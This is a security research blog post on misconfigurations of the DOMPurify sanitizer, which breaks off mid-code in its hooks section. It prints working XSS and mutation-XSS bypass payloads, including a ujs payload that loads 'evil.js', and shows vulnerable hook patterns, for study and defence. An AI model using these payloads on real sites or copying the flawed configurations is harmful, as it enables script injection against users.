---
source: kevin-mizu
source_url: https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations
title: "Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) | mizu.re"
description: "Exploring the DOMPurify library: Hunting for Misconfigurations (2/2), Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explo"
---

_keyboard\_arrow\_up_

title: Exploring the DOMPurify library: Hunting for Misconfigurations (2/2)

date: Feb 10, 2025

tags: [Article](https://mizu.re/tag/Article) [Web](https://mizu.re/tag/Web) [mXSS](https://mizu.re/tag/mXSS)

# Exploring the DOMPurify library: Hunting for Misconfigurations (2/2)

- [📜 Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#introduction)
- [🎓 DOMPurify Misconfigurations 101](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-misconfigurations-101)

  - [Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-misconfigurations-introduction)
  - [Dangerous allow-lists](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists)
  - [Dangerous URI attributes configuration](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-uri-attributes-configuration)
  - [Bad usage \| Not enough context](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bad-usage-not-enough-context)
  - [Bad usage \| Replacing the output](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bad-usage-replacing-the-output)

    - [CVE-2020-11022 - jQuery <= 3.4.1 (found by @kinugawamasato 👑)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2020-11022-jquery-lte-3.4.1)
    - [CVE-2023-48219 - TinyMCE < 6.7.3 (found by @kinugawamasato 👑)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce)

  - [More examples...](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#more-examples)

- [🪝 DOMPurify Hooks](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-hooks)

  - [Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-hooks-introduction)
  - [≤ 3.1.5 & 3.1.7 \| uponSanitizeAttribute & forceKeepAttr = true](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#uponSanitizeAttribute-forceKeepAttr)
  - [Latest \| uponSanitizeAttribute & currentNode.setAttribute](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#uponSanitizeAttribute-setAttribute)
  - [Latest \| beforeSanitizeAttributes & attribute manipulation](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#beforeSanitizeAttributes-manipulation)
  - [Latest \| afterSanitizeAttribute & (string replacement \|\| attribute manipulation)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#afterSanitizeAttribute-replacement-manipulation)
  - [Latest \| Node manipulation (insertBefore)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#node-manipulation-insertBefore)
  - [Latest \| Base href pollution](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#base-href-pollution)
  - [Latest \| nodeName namespace case confusion](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#nodeName-namespace-case-confusion)
  - [Latest \| beforeSanitizeElements === DOM Clobbering DOS](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#before-sanitize-elements-dos)

- [🗃️ Miscellaneous](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#miscellaneous)

  - [Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#miscellaneous-introduction)
  - [DOMPurify > 3.1.2 + SAFE\_FOR\_XML: false === bypass](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-gt-3.1.2-safe-for-xml)
  - [DOMPurify 3.1.3 & 3.1.4 nested node restriction bypass](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-3.1.3-3.1.4-nested-node-bypass)
  - [JSON to HTML libraries](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#json-to-html-libraries)
  - [Content-Type without charset=](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#content-type-no-charset)
  - [CVE-2024-51757 - happy-dom < 15.10.0 RCE](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2024-51757-happy-dom-rce)
  - [DOMPurify 2.3.1 ≤ 3.1.2 specific configuration bypass](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dompurify-2.3.1-3.1.2-specific-bypass)

- [🏁 Conclusion](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#conclusion)
- [📚 Bibliography](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bibliography)

## [📜 Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#introduction)

This article is the last of a two-article series focusing on DOMPurify security. In the [previous article](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes), we ended with the statement: "the library's security now relies heavily on a single regular expression". Because of this, certain configurations of DOMPurify can now lead to a downgrade in sanitization protection, resulting in a full bypass even in the latest version.

The goal of this article is to describe the challenges that [@cure53berlin](https://x.com/cure53berlin) is currently facing and how this strong approach, despite its effectiveness, brings its own limitations.

_All the examples in this article will use the latest version at the time of writing (3.2.4)._

## [🎓 DOMPurify Misconfigurations 101](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-misconfigurations-101)

### [Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-misconfigurations-introduction)

It's not new that, depending on DOMPurify's configuration, there might be a downgrade in sanitization protection. This could lead to either a small sanitization downgrade or, in the worst case, a full sanitization bypass.

As a security researcher, if you want to look for DOMPurify misconfigurations, the best way is to:

1. Search for the <!--> or \\x3c!--\\x3e string in all the compiled JS files. This is used at the beginning of the [sanitize](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1438) function ( [ref](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1448)).
2. Add a log point or breakpoint at the beginning of the sanitize function.
3. Retrieve the arguments variable, which contains both the dirty string that needs to be sanitized and the configuration that is applied.

![dompurify.gif](https://mizu.re/articles/articles/vuln06_dompurify/article02/images/dompurify.gif)

**Fig. 1**: Process to retrieve the DOMPurify.sanitize options and the DOMPurify version.

_If you want to find the DOMPurify version, you can log this.version or search for .isSupported as well!_

It is important to keep in mind that each DOMPurify.sanitize call can have a different configuration, meaning that one call might be safe while the next might not be.

That being said, in the following subsections, we will focus on different types of misconfigurations that can lead to dangerous bypasses.

### [Dangerous allow-lists](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dangerous-allow-lists)

Among all the possible configurations, there are those that directly impact what DOMPurify is supposed to allow. Obviously, depending on how it is configured, it might break the sanitizer. For example, if the developer opt-in dangerous tags, it might be possible to bypass DOMPurify even on the latest version.

- ALLOWED\_TAGS ( [default](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L201) \| [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L1086)): Overwrite the default ALLOWED\_TAGS value.
- ALLOWED\_ATTR ( [default](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L211) \| [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L1198)): Overwrite the default ALLOWED\_ATTR value.
- ADD\_TAGS ( [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L605)): Add tags to the ALLOWED\_TAGS value.
- ADD\_ATTR ( [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L613)): Add tags to the ALLOWED\_ATTR value.

```js
{
    ALLOWED_TAGS: [ "script" ],
    ADD_TAGS: [ "noscript" ],
    ALLOWED_ATTR: [ "onload" ],
    ADD_ATTR: [ "onerror" ]
}
```

Dom-Explorer

**Fig. 2**: Example of incorrect usage of ALLOWED\_TAGS, ADD\_TAGS, ALLOWED\_ATTR, and ADD\_ATTR configuration options.

_As a developer, if you have any doubt about the tags / attributes you want to allow, using USE\_PROFILES: { html: true } might be a good start!_

One important thing to keep in mind is that even if all the attributes are disallowed, the data- and aria- attributes are still allowed, as long as the two following configuration flags aren't set to false.

- ALLOW\_DATA\_ATTR ( [default](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L257) =true \| [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L1190)): Allows data- attributes to be used.
- ALLOW\_ARIA\_ATTR ( [default](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L254) =true \| [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L1195)): Allows aria- attributes to be used.

```json
{
    "ALLOWED_ATTR": []
}
```

Dom-Explorer

**Fig. 3**: Example of an empty ALLOWED\_ATTR option with data- and aria- attributes in DOMPurify's output.

For example, this could be very useful with [ujs](https://github.com/rails/rails/blob/v8.0.1/actionview/app/assets/javascripts/rails-ujs.js) present on the website, which allows a one-click XSS with the following snippet: ( [gitlab #213273](https://gitlab.com/gitlab-org/gitlab/-/issues/213273) \| [gitlab #336138](https://gitlab.com/gitlab-org/gitlab/-/issues/336138)).

```html
<a data-remote="true" data-method="get" data-type="script" href="evil.js">XSS</a>
```

**Fig. 4**: Example of data- attribute ujs XSS payload.

_Another important point is that even with the default configuration, DOMPurify allows the use of <style>, which can be leveraged for CSS exfiltration, and <form>, which can be used to perform CSRF attacks!_

### [Dangerous URI attributes configuration](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dangerous-uri-attributes-configuration)

Additionally to the previous options, it is possible to configure how "URI" attributes are handled. Beyond this, there are two configuration options that can be set, which could lead to a full bypass of the sanitization.

- ALLOWED\_URI\_REGEXP ( [default](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/regexp.ts#L9) \| [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L1232)): It is designed to overwrite the default allowed URI regex. Like every regex check, making it too permissive could allow users to inject javascript:.

```json
{
    "ALLOWED_URI_REGEXP": /https:\/\/mizu.re/
}
```

Dom-Explorer

**Fig. 5**: Example of an overly permissive ALLOWED\_URI\_REGEXP regex option.

- ADD\_URI\_SAFE\_ATTR ( [usage](https://github.com/cure53/DOMPurify/blob/f0d750730b2595722bde07bbbee1ee65c79943aa/src/purify.ts#L1227)): This aims to whitelist a specific type of URI attribute from being sanitized.

```json
{
    "ADD_URI_SAFE_ATTR": ["href"]
}
```

Dom-Explorer

**Fig. 6**: Example of the dangerous usage of the ADD\_URI\_SAFE\_ATTR option.

### [Bad usage \| Not enough context](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#bad-usage-not-enough-context)

Among misconfigurations based on the options object passed to DOMPurify, the way it is used is also important. While this is not directly a "misconfiguration", it can still impact the effectiveness of the library. The most well-known issue of this kind is probably related to sanitizing in the context of a server-side usage.

```js
const express = require("express");
const { JSDOM } = require("jsdom");
const DOMPurify = require("dompurify");
const app = express();

app.get("/sanitize", (req, res) => {
  const dom = new JSDOM("");
  const purify = DOMPurify(dom.window);
  const cleanHTML = purify.sanitize(req.query.html);
  res.send("<textarea>"+cleanHTML+"</textarea>");
});

app.listen(3000, () => {});
```

**Fig. 7**: Example of improper server-side DOMPurify usage.

_The <textarea> tag can be replaced by <iframe>, <noscript>, <style>, <xmp>, <noframes>, <script>, <noembed>, <title> (not working anymore with <style> and <title> since DOMPurify 3.1.3 due to the new regex checks)._

In the above example, DOMPurify doesn't know where the HTML is going to be used. Because of this, when the browser receives the HTTP response and parses the entire page, not just the DOMPurify sanitizing context, it is possible to bypass the filter using the following payload:

```html
<div id="</textarea><img src=x onerror=alert()>"></div>
```

**Fig. 8**: Example of payload to bypass improper server-side DOMPurify usage.

Another example (which only works for DOMPurify up to version 3.1.2) is related to the namespace used for sanitization compared to the one the DOM uses to parse it.

```html
<div id="data1"></div>
<div id="data2"></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.2/purify.min.js"></script>
<script>
    const params = new URLSearchParams(location.search);
    const data   = JSON.parse(params.get("data"));
    document.getElementById("data1").innerHTML = DOMPurify.sanitize(data["data1"]);
    document.getElementById("data2").innerHTML = DOMPurify.sanitize(data["data2"]);
</script>
```

**Fig. 9**: Example of improper client-side DOMPurify ≤ 3.1.2usage.

_I made a Twitter challenge about it a year ago → [source](https://x.com/kevin_mizu/status/1735984327274688630)._

In this case, it is possible to hijack the data2 ID to force the second output to be rendered as SVG, creating a namespace confusion using the following payload:

```json
{"data1":"<svg id='data2'></svg>","data2":"x<style><!--</style><a id='--&gt;<title><img src=x onerror=alert()>'>"}
```

**Fig. 10**: Example of payload to bypass improper client-side DOMPurify ≤ 3.1.2usage.

### [Bad usage \| Replacing the output](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#bad-usage-replacing-the-output)

#### [CVE-2020-11022 - jQuery <= 3.4.1 (found by @kinugawamasato 👑)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#cve-2020-11022-jquery-lte-3.4.1)

Another case of "bad usage", first highlighted by [@kinugawamasato](https://x.com/kinugawamasato), is related to the jQuery [CVE-2020-11022](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2) ( [fix](https://github.com/jquery/jquery/commit/90fed4b453a5becdb7f173d9e3c1492390a1441f)).

In short, before version 3.4.2 (released in 2020), jQuery was normalizing dirty HTML strings when using the .html() method, replacing the old /> xHTML notation with ></TAG>. Because of this, a hotfix was applied in DOMPurify version 2.1.0 to mitigate the issue if a recent version of DOMPurify was used with an older jQuery library ( [ref](https://github.com/cure53/DOMPurify/commit/5daf669bb90c2de107a023607924482ef66d3c6f)).

Therefore, since DOMPurify 3.0.0 ( [commit](https://github.com/cure53/DOMPurify/commit/6e98d486a9223bd221a3a6fc858f57b172442ab1)), a new option flag has been added ( [ALLOW\_SELF\_CLOSE\_IN\_ATTR](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1339)), which allows the developer to opt in or out of the /> attribute filter (cf. [#761](https://github.com/cure53/DOMPurify/issues/761)). By default, since that version, the filter is deactivated (ALLOW\_SELF\_CLOSE\_IN\_ATTR=true), making the jQuery \+ DOMPurify bypass possible again if an old enough jQuery version is used.

```html
<div id="a"></div>
<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.3/purify.min.js"></script>
<script>
    var n = 503;
    var clean = DOMPurify.sanitize(`
    ${"<r>".repeat(n)}
    <a>
        <svg>
            <desc>
                <svg>
                    <image>
                        <a>
                            <desc>
                                <svg>
                                    <image></image>
                                </svg>
                            </desc>
                        </a>
                    </image>
                    <style><a id="><style/><img src=x onerror=alert(1)>"></a></style>
                </svg>
            </desc>
        </svg>
    </a>
    `);
    $("#a").html(clean);
</script>
```

**Fig. 11**: Example of a bypass with jQuery <= 3.4.1 and DOMPurify 3.2.4.

#### [CVE-2023-48219 - TinyMCE < 6.7.3 (found by @kinugawamasato 👑)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#cve-2023-48219-tinymce)

Found by [@kinugawamasato](https://x.com/kinugawamasato) as well, this issue involves replacement to null occurring after DOMPurify. More details can be found [here](https://vulnerabledoma.in/tinymce/CVE-2023-48219.html), but in short:

```js
var clean = DOMPurify.sanitize("x<style><\uFEFF/style><\uFEFFimg src=x onerror=alert()></style>");
clean = clean.replaceAll("\uFEFF", "");
console.log(clean); // x<style></style><img src=x onerror=alert()></style>
```

**Fig. 12**: Example of a DOMPurify bypass due to string replacement in the DOMPurify output.

Something even more interesting about this kind of issue is that even if the replacement is done before and after DOMPurify, it is possible to abuse the fact that HTML parsing (via DOMParser()) decodes text entities outside of text nodes:

```js
var n = 503;
var dirty = `
${"<r>".repeat(n)}
<a>
    <svg>
        <desc>
            <svg>
                <image>
                    <a>
                        <desc>
                            <svg>
                                <image></image>
                            </svg>
                        </desc>
                    </a>
                </image>
                <style><a id="<&#xFEFF;/style><img src=x onerror=alert(1)>"></a></style>
            </svg>
        </desc>
    </svg>
</a>
</form>
`;
dirty = dirty.replaceAll("\uFEFF", "");
var clean = DOMPurify.sanitize(dirty)
clean = clean.replaceAll("\uFEFF", "");
document.body.innerHTML = clean;
```

**Fig. 13**: Example of a DOMPurify bypass due to string replacement before and after DOMPurify.

_<self-promotion> You can learn how to automatically detect this kind of issue with [DOMLogger++](https://github.com/kevin-mizu/domloggerpp) in the **Bypass HTML Sanitizer 2** exercise of the [GreHack 2024 Workshop](http://domloggerpp-workshop.mizu.re:5173/). </self-promotion>_

### [More examples...](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#more-examples)

Since the goal of this article isn't to list everything that has already been found, below is a list of interesting research on specific DOMPurify misconfiguration bypasses:

| Author | Ressource |
| --- | --- |
| [@maple3142](https://x.com/maple3142) | [ImaginaryCTF 2023 - Sanitized Revenge](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge) |
| [@kevin\_mizu](https://x.com/kevin_mizu) | [Playing with DOMPurify custom elements handling](https://mizu.re/post/playing-with-dompurify-ce-handling) |
| [@slonser\_](https://x.com/slonser_) | [DOMPurify - untrusted Node bypass](https://blog.slonser.info/posts/dompurify-node-type-confusion/) |
| [@ryotkak](https://x.com/ryotkak) | [Bypassing DOMPurify with good old XML](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/) |
| [@kinugawamasato](https://x.com/kinugawamasato) | [DOMPurify 3.1.6 foreignObject bypass](https://x.com/kinugawamasato/status/1843687909431582830) |
| [@slonser\_](https://x.com/slonser_) | [DOMPurify - dirty namespace bypass](https://blog.slonser.info/posts/dompurify-dirty-namespace-bypass/) |
| [@J0R1AN](https://x.com/J0R1AN) | [Mutation XSS: Explained, CVE and Challenge](https://jorianwoltjer.com/blog/p/hacking/mutation-xss) |
| [@YNizry](https://x.com/YNizry) | [DOMPurify 3.2.1 Bypass (Non-Default Config)](https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/) |
| [@ensyzip](https://x.com/ensyzip) | [DOMPurify 3.2.3 Bypass (Non-Default Config)](https://ensy.zip/posts/dompurify-323-bypass/) |

_Again, I'm probably missing some great ones, sorry in advance! If you want your article to be added, ping me on Twitter ;D_

## [🪝 DOMPurify Hooks](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-hooks)

### [Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-hooks-introduction)

Now that we've seen several kinds of misconfigurations, we are going to focus on hooks, which have become a very interesting vectors since the regex implementation in DOMPurify 3.1.3.

In short, hooks aim to provide developers a way to define custom code at specific execution points. DOMPurify offers a list of 9 different hooks, which can be defined using the [DOMPurify.addHook](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1633) method.

| Hook name | Params | Description |
| --- | --- | --- |
| [beforeSanitizeElements](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1028) | currentNode | Executed at the begining of the [\_sanitizeElements](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1024) function. |
| [uponSanitizeElement](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1040) | currentNode | Executed at the begining of the [\_sanitizeElements](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1024) function right after the DOM Clobbering checks. |
| [afterSanitizeElements](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1144) | currentNode | Executed at the end of the [\_sanitizeElements](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1024) function. |
| [beforeSanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1274) | currentNode | Executed at the begining of the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function. |
| [uponSanitizeAttribute](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1305) | currentNode, {attrName, attrValue, keepAttr, forceKeepAttr} | Executed in the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function each time a new attribute sanitization begin. |
| [afterSanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1402) | currentNode | Executed at the end of the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function. |
| [beforeSanitizeShadowDOM](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1415) | fragment | Executed at the begining of the [\_sanitizeShadowDOM](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function. |
| [uponSanitizeShadowNode](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1419) | shadowNode | Executed in the [\_sanitizeShadowDOM](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1410) function before the [\_sanitizeElements](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1024) call. |
| [afterSanitizeShadowDOM](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1434) | fragment | Executed at the end of the [\_sanitizeShadowDOM](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function. |

**Fig. 14**: List of all available DOMPurify hooks.

![dompurify.png](https://mizu.re/articles/articles/vuln06_dompurify/article02/images/dompurify.png)

**Fig. 15**: Simplified DOMPurify execution flow.

Here is a simple example of how they could be used:

```js
DOMPurify.addHook("uponSanitizeElement", function(currentNode, hookEvent) {
    console.log(currentNode.nodeName)
})

DOMPurify.sanitize("<p>Hello World!</p>");
/*
BODY
P
#text
*/
```

**Fig. 16**: Example of DOMPurify's uponSanitizeElement hook usage.

The difference with the options object, which is linked to a DOMPurify.sanitize usage, is that hook definitions are global and applied to every call. Due to this, they can be defined anywhere in an application's code.

> What makes these so important to check? What effect has the new regex implementation had on these?

Firstly, they are used by developers to implement custom sanitization code, which, depending on how the DOM is manipulated, could break the sanitization process.

Secondly, since the introduction of attribute regex filtering, old hook configurations that were previously safe may now pose a risk of fully downgrading the sanitization process!

That being said, let's cover some hook misconfigurations :D

### [≤ 3.1.5 & 3.1.7 \| uponSanitizeAttribute & forceKeepAttr = true](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#uponSanitizeAttribute-forceKeepAttr)

This is the very first hook misconfiguration I found and reported to [@cure53berlin](https://x.com/cure53berlin). As seen in the table above, the [uponSanitizeAttribute](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1305) hook is triggered in the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function each time a new attribute sanitization begins.

In version 3.1.5, this is how it was handled:

```js
_executeHook('uponSanitizeAttribute', currentNode, hookEvent);
value = hookEvent.attrValue;
/* Did the hooks approve of the attribute? */
if (hookEvent.forceKeepAttr) {
    continue;
}

// [...]

/* Work around a security issue with comments inside attributes */
if (SAFE_FOR_XML && regExpTest(/((--!?|])>)|<\/(style|title)/i, value)) {
_removeAttribute(name, currentNode);
    continue;
}
```

**Fig. 17**: DOMPurify's 3.1.5 \_sanitizeAttributes function ( [ref](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272)).

As we can see, if the developer forces the attribute to be kept using the forceKeepAttr hookEvent value, then DOMPurify doesn't sanitize this attribute at all, including the regex verification.

This allows, in such a context, bypassing the regex filter and reusing the DOMPurify 3.1.2 bypass again!

```js
// This is an example
DOMPurify.addHook("uponSanitizeAttribute", function(currentNode, hookEvent) {
    if (currentNode.nodeName.toUpperCase() === "A" & event.attrName === "data-x") {
            hookEvent.forceKeepAttr = true;
    }
})
```

Dom-Explorer

**Fig. 18**: Example of uponSanitizeAttribute with forceKeepAttr usage.

Dom-Explorer

**Fig. 19**: DOMPurify 3.1.5 custom uponSanitizeAttribute hook bypass using forceKeepAttr.

_As you might have noticed, DOM Clobbering is no longer necessary since [@cure53berlin](https://x.com/cure53berlin) decided to remove nested node protection starting from DOMPurify 3.1.5 ( [ref](https://github.com/cure53/DOMPurify/commit/7cf4890aea9e93b4e467b5f81a3f2292b2837eb7)). This change was made because the regex alone is strong enough to protect against mXSS._

As a real-world example of this issue, [jgraph/drawio](https://github.com/jgraph/drawio) had the following DOMPurify configuration, which could be bypassed:

```js
DOMPurify.addHook("uponSanitizeAttribute", (node, ev) => {
    if (
        node.nodeName  === "svg" &&
        ev.attrName === "content"
    ) {
        ev.forceKeepAttr = true;
    }
    return node
});

DOMPurify.sanitize(user_input);
```

**Fig. 20**: [jgraph/drawio](https://github.com/jgraph/drawio) uponSanitizeAttribute custom hook.

_I left the PoC as an exercise for the reader ;)_

### [Latest \| uponSanitizeAttribute & currentNode.setAttribute](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#uponSanitizeAttribute-setAttribute)

The next hook misconfiguration still works in the latest version and is more related to the timing of when uponSanitizeAttribute is used.

```js
const { attributes } = currentNode; // 1.
// [...]
let l = attributes.length; // 2.

/* Go backwards over all attributes; safely remove bad ones */
while (l--) {
    const attr = attributes[l]; // 3.
    const { name, namespaceURI, value: attrValue } = attr;
    const lcName = transformCaseFunc(name);

    let value = name === 'value' ? attrValue : stringTrim(attrValue);

    // [...]
    _executeHooks(hooks.uponSanitizeAttribute, currentNode, hookEvent); // 4.
    value = hookEvent.attrValue;
    // [...]
}
```

**Fig. 21**: DOMPurify's 3.2.4 \_sanitizeAttributes function ( [ref](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272)).

From the snippet above, the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) function does the following:

1\. Retrieves the current node's attributes.

2\. Retrieves the number of attributes the current node has.

3\. Loops over each attribute.

4\. Before sanitizing an attribute, invokes the uponSanitizeAttribute hook.

An important detail about this flow is that if the developer uses the uponSanitizeAttribute hook to add a new attribute, for example, using the .setAttribute method, this attribute won't be sanitized by DOMPurify at all, as the attributes list has already been retrieved!

```js
// This is an example
DOMPurify.addHook("uponSanitizeAttribute", (currentNode, hookEvent) => {
    if (hookEvent.attrName === "x") {
        currentNode.setAttribute("data-x", hookEvent.attrValue);
    }
})
```

Dom-Explorer

**Fig. 22**: DOMPurify uponSanitizeAttribute \+ .setAttribute example.

Because of this, if part of the new attribute value is user-controlled, it is possible to bypass the regex once again and evade DOMPurify, even in the latest version.

Dom-Explorer

**Fig. 23**: DOMPurify bypass using currentNode.setAttribute in the uponSanitizeAttribute hook.

### [Latest \| beforeSanitizeAttributes & attribute manipulation](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#beforeSanitizeAttributes-manipulation)

Something you might have noticed in the previous misconfiguration is that DOMPurify retrieves currentNode attributes using the [destructuring assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment) JavaScript notation ( [ref](https://github.com/cure53/DOMPurify/blob/6676133b2ba2fe02346a4794a712e5ec2c3539a0/src/purify.js#L1253)).

Similar to prototype pollution, this notation can also be abused using DOM Clobbering. However, as we saw in the first article, it won't be possible to create a dangerous DOM Clobbering setup here since the trim normalization occurs a few lines later.

However, from a hooks perspective, the beforeSanitizeAttributes hook is invoked just one line above!

```js
  const _sanitizeAttributes = function (currentNode: Element): void {
    /* Execute a hook if present */
